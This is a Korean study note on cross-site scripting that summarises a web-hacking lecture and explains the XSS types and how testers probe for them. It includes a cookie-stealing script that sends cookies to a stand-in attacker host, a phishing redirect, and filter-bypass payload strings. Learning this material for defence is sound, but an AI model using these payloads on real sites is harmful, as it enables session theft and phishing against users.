# Cross-Site-Scripting(XSS)

[클라이언트 사이드 취약점] 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하도록 하는 취약점
* 다른 사용자의 정보를 추출하는 공격 기법 → 특정 계정의 세션 정보를 탈취하고 해당 계정으로 임의의 기능을 수행할 수 있음
	- XSS 공격을 통해 가져오는 주요 정보 = 사용자가 웹 서버로 전송한 **고유 쿠키 값**
  - XSS 공격으로 악성 스크립트가 삽입된 페이지에 **이용자가 접속할 때**, 또는 **이용자가 해당 게시물을 열람할 때** 악성 스크립트 코드가 실행되어 쿠키 및 세션이 탈취될 수 있음
* *이용자가 삽입한 내용을 출력하는 기능*에서 XSS 공격이 발생함
	- 이용자의 입력을 받아들이는 부분의 스크립트 코드를 필터링하지 않음으로써 공격자가 스크립트 코드를 실행할 수 있게 됨
	- HTML, CSS, JS와 같은 코드가 포함된 게시글을 이용자가 조회할 경우 변조된 페이지를 보거나 악성 스크립트가 실행될 수 있음

#### XSS 공격의 특징
* 간단하지만 파괴력이 있는 것이 특징이며, 웹 애플리케이션 사이트에 방문하는 사용자를 공격하는 기법 중 최고로 손꼽힘
* SOP 보안 정책의 등장으로 서로 다른 출처(Origin)에서 정보를 읽는 행위가 이전에 비해 힘들어졌지만, SOP 정책을 우회하는 다양한 기술이 등장하면서 XSS 공격은 지속되고 있음

#### XSS 발생 종류
| 종류 | 설명 |
|--------|-----------------|
| Stored XSS | XSS에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS |
| Reflected XSS | XSS에 사용되는 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS |
| DOM-based XSS | XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입되는 XSS (Fragment는 서버 요청/응답에 포함되지 않음) |
| Universal XSS | 클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 XSS 취약점 (SOP 정책을 우회함) |

### XSS 스크립트 예시
* XSS 스크립트
	- 이용자와의 상호작용 없이 **이용자의 권한으로 정보를 조회하거나 변경**하는 등의 행위가 가능함
		+ 가능한 이유: 이용자를 식별하기 위한 세션 및 쿠키가 웹 브라우저에 저장되어 있기 때문
	- 공격자는 자바스크립트를 통해 **이용자에게 보여지는 웹 페이지를 조작**하거나, **웹 브라우저의 위치를 임의의 주소로 변경**할 수 있음
* 자바스크립트를 실행하기 위한 태그들을 사용해 XSS 공격을 수행함
	- 쿠키 및 세션 탈취 코드
		```html
		<script>
			// 쿠키 생성(key: name, value: attacker)
			document.cookie = “name=attacker;”
			// 공격자 주소로 현재 페이지의 쿠키를 요청함
			new Image().src = “http://hacker-address.com/?cookie=" + document.cookie;
		</script>
		```
	- 페이지 변조 코드
		```html
		<script>
			// 이용자의 페이지 정보에 접근
			document;
			// 이용자의 페이지에 데이터 삽입
			document.write(“XSS Success”);
		</script>
		```
	- 위치 이동 공격 코드
		```html
		<script>
			// 이용자의 위치를 변경 (피싱 공격 등에 사용됨
			location.href = “http://hacker-address.com/phishing";
			// 새 창 열기
			window.open(“http://hacker-address.com");
		</script>
		```

<br/>

### Stored XSS
[가장 일반적인 XSS 공격 유형] 서버의 데이터베이스 또는 파일 등의 형태로 저장된 악성 스크립트를 **조회**할 때 발생하는 XSS
* 이용자가 글을 저장하는 부분에 정상적인 평문이 아닌 스크립트 코드를 입력함 → 다른 이용자가 게시물을 열람하는 순간 악성 스크립트가 실행됨
* Stored XSS 취약점이 존재하는 곳 - 게시판이나 댓글, 자료실과 같이 **사용자가 입력한 값을 웹 애플리케이션에 저장해 두는 곳**
	- 스크립트에 대한 필터링을 하지 않으면 해당 게시물을 열람하는 일반 이용자가 악성 스크립트에 피해를 입게 됨
	- 특히 게시판은 불특정 다수에게 보여지기 때문에 해당 기능에서 XSS 취약점이 존재할 경우 높은 파급력을 가짐
* Stored XSS 예시<br/><br/>
	<img width="764" alt="Stored XSS" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/2f13f43e-3d65-451f-ae34-ac1d1ad49a42">

<br/>

### Reflected XSS
서버가 **악성 스크립트가 담긴 요청을 출력**할 때 발생하는 XSS
* URL의 변수 부분처럼 스크립트 코드를 입력하는 동시에 결과가 바로 전해지는 공격 기법
	- URL과 같은 이용자의 요청에 의해 발생함 → *공격을 위해서는 타 이용자에게 악성 스크립트가 포함된 링크에 접속하도록 유도*해야 함
		+ 일부 검색 서비스에서 검색 결과를 응답에 포함하는데, 검색 문자열에 악성 스크립트가 포함되어 있다면 Reflected XSS가 발생할 수 있음
* 이용자에게 악성 스크립트가 포함된 링크를 전달하기 위해 Click Jacking 또는 Open Redirect 등 다른 취약점과 연계하여 사용함
	- 링크를 직접 전달할 경우 악성 스크립트 포함 여부를 쉽게 파악할 수 있음
	- 주로 공격 스크립트 코드를 인코딩한 후 전달하여 사용자가 쉽게 눈치채지 못하게 함
* Reflect XSS 예시<br/><br/>
	<img width="741" alt="Reflected XSS" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/060dc11c-98c3-4e2a-9fb5-a75bb0c4e688">

<br/>

## XSS 취약점을 찾는 방법
* 가장 기본적인 방법 - 표준 스크립트 문자열을 입력해보는 것
	```html
	<script>alert(document.cookie);</script>
	```
	- 기존 입력값 뒤에 이어서 추가되는 코드라면 코드 분석을 통해 ```<script>``` 앞부분에 ```‘>```또는 ```“>```와 같이 스크립트를 닫는 코드를 추가해야 함
	- 스크립트 검증 예시로 사용되는 코드
		```html
		"><script>alert(document.cookie);</script>
		"><ScRiPt>alert(document.cookie);</ScRiPt>
		"%3e%3cscript%3ealert(document.cookie);%3c/script%3e
		"><scr<script>ipt>alert(document.cookie);</scr</script>ipt>
		%00"><scriptalert(document.cookie);</script>
		```
		+ 두 번째 코드부터는 **script 문자열 필터링을 무력화**하기 위해 대﹒소문자 혼용, 인코딩 사용, 스크립트 안에 스크립트 태그 사용과 같은 다양한 공격 시도를 하는 패턴임
* 대부분의 애플리케이션은 XSS 공격을 막기 위해 기본적으로 블랙리스트 기반의 필터링을 수행함
	- 보안을 많이 신경쓰는 웹 사이트는 기본적으로 사용자의 입력값을 다양한 방식으로 차단함
	- 애플리케이션에서 사용자 입력값을 처리하는 부분이 상당히 많다 보니 XSS 취약점이 발견되는 경우가 많음

<br/><br/><br/><br/>
### 🔖 출처
* [드림핵 Web Hacking] 📌 [ClientSide: XSS](https://dreamhack.io/lecture/courses/173)
